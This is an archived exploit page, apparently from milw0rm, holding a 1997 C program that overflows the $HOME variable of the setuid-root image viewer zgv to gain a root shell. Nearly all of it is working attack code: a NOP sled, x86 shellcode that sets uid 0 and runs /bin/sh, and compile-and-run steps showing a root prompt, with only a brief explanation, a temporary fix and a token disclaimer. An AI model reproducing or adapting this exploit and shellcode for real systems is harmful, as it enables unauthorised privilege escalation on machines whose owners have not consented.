<html><head><title>zgv $HOME overflow</title></head><pre>/*
 *
 * zgv exploit coded by BeastMaster V on June 20, 1997
 *
 * USAGE:
 *   For some strage reason, the filename length of this
 *   particular exploit must me one character long, otherwise you
 *   will be drop into a normal unpriviledged shell. Go Figure....
 *
 *   $ cp zgv_exploit.c n.c
 *   $ cc -o n n.c
 *   $ ./n
 *   Oak driver: Unknown chipset (id =  0)
 *   bash#
 *
 * EXPLANATION: zgv (suid root) does not check bounds for $HOME env.
 * TEMPORARY FIX:  chmod u-s /usr/bin/zgv
 * NOTE: Don't forget to visit http://www.rootshell.com for more exploits.
 * DISCLAIMER: Please use this in a responsible manner.
 * 
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

char *shellcode =
  &quot;\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1&quot;
  &quot;\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04&quot;
  &quot;\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb&quot;
  &quot;\xcd\x80/&quot;
  &quot;/bin/sh&quot;
  &quot;0&quot;;

char *get_sp() {
   asm(&quot;movl %esp,%eax&quot;);
}

#define bufsize 4096
char buffer[bufsize];

main() {
  int i;

  for (i = 0; i &lt; bufsize - 4; i += 4)
    *(char **)&amp;buffer[i] = get_sp() -4675;

  memset(buffer, 0x90, 512);
  memcpy(&amp;buffer[512], shellcode, strlen(shellcode));

  buffer[bufsize - 1] = 0;

  setenv(&quot;HOME&quot;, buffer, 1);

  execl(&quot;/usr/bin/zgv&quot;, &quot;/usr/bin/zgv&quot;, NULL);
}

// milw0rm.com [1997-06-20]</pre></html>